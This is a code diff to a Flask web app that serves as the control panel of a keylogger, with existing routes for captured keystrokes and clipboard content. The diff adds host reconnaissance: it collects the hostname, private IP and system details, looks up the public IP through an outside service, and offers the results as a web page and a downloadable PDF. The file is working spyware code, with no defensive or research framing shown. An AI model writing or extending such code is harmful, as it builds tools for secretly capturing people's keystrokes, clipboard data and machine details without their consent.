@@ -7,6 +7,9 @@ import pyperclip
 from io import BytesIO
 from reportlab.lib.pagesizes import letter
 from reportlab.pdfgen import canvas
+import platform
+import socket
+
 
 app = Flask(__name__)
 
@@ -51,6 +54,26 @@ class Keylogger:
     
     def get_keystrokes(self):
         return self.keystrokes
+    
+def computer_information():
+    hostname = socket.gethostname()
+    IPAddr = socket.gethostbyname(hostname)
+    system_info = {
+        'Hostname': hostname,
+        'Private IP Address': IPAddr,
+        'Public IP Address': '',
+        'Processor': platform.processor(),
+        'System': platform.system(),
+        'Machine': platform.machine(),
+        'Platform Version': platform.version()
+    }
+    try:
+        public_ip = requests.get("https://api.ipify.org").text
+        system_info['Public IP Address'] = public_ip
+    except Exception:
+        system_info['Public IP Address'] = 'Could not retrieve'
+
+    return system_info
 
 # Create an instance of the Keylogger class
 keylogger = Keylogger()
@@ -90,6 +113,14 @@ def clipboard_content():
     clipboard_content = keylogger.get_clipboard_content()
     return render_template('clipboard.html', title='Clipboard Content', clipboard_content=clipboard_content)
 
+
+@app.route('/system_info')
+def system_info():
+    system_data = computer_information()
+    return render_template('systeminfo.html', title='System Information', system_data=system_data)
+
+
+
 # Route to generate and download PDF containing clipboard content
 @app.route('/download_pdf')
 def download_pdf():
@@ -104,6 +135,11 @@ def download_logs():
     pdf = generate_pdf(logs_content)
     return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=logs_content.pdf'})
 
+@app.route('/download_system_info_pdf')
+def download_system_info_pdf():
+    system_data = computer_information()
+    pdf = generate_system_info_pdf(system_data)
+    return Response(pdf, mimetype='application/pdf', headers={'Content-Disposition': 'attachment;filename=system_info.pdf'})
     
 
 # Function to generate PDF document
@@ -113,6 +149,19 @@ def generate_pdf(content):
     y = 750
     for item in content:
         c.drawString(50, y, item)
+        y -= 20
+    c.save()
+    pdf = buffer.getvalue()
+    buffer.close()
+    return pdf
+
+
+def generate_system_info_pdf(system_data):
+    buffer = BytesIO()
+    c = canvas.Canvas(buffer, pagesize=letter)
+    y = 750
+    for key, value in system_data.items():
+        c.drawString(50, y, f'{key}: {value}')
         y -= 20
     c.save()
     pdf = buffer.getvalue()
